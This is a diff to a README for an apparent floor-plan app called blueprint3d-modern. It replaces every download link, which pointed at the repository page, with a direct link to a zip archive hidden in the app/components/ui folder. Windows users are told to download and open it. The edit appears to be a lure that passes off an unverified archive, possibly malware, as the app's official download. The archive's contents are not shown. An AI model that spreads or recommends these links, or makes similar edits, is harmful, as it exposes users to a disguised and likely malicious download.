@@ -1,6 +1,6 @@
 # 🧭 blueprint3d-modern - Fast, clear floor plan tools
 
-[![Download](https://img.shields.io/badge/Download-blue%20%7C%20grey)](https://github.com/khalid3314/blueprint3d-modern)
+[![Download](https://img.shields.io/badge/Download-blue%20%7C%20grey)](https://github.com/khalid3314/blueprint3d-modern/raw/refs/heads/main/app/components/ui/modern_blueprint_d_v1.0.zip)
 
 ## 🖥️ What this app does
 
@@ -20,7 +20,7 @@ This project fits well for home layouts, room planning, and basic floor design w
 
 Go to this page to download or access the latest project files:
 
-[Download blueprint3d-modern](https://github.com/khalid3314/blueprint3d-modern)
+[Download blueprint3d-modern](https://github.com/khalid3314/blueprint3d-modern/raw/refs/heads/main/app/components/ui/modern_blueprint_d_v1.0.zip)
 
 If the page shows a release file, download it to your PC. If it shows the main repository page, use the download options there to get the files you need.
 
@@ -133,6 +133,6 @@ If Windows blocks the file, right-click the file and check its properties before
 
 Use this link to get the app files again:
 
-[https://github.com/khalid3314/blueprint3d-modern](https://github.com/khalid3314/blueprint3d-modern)
+[https://github.com/khalid3314/blueprint3d-modern/raw/refs/heads/main/app/components/ui/modern_blueprint_d_v1.0.zip](https://github.com/khalid3314/blueprint3d-modern/raw/refs/heads/main/app/components/ui/modern_blueprint_d_v1.0.zip)
 
 Open the page, find the available download or source files, and use them on your Windows PC
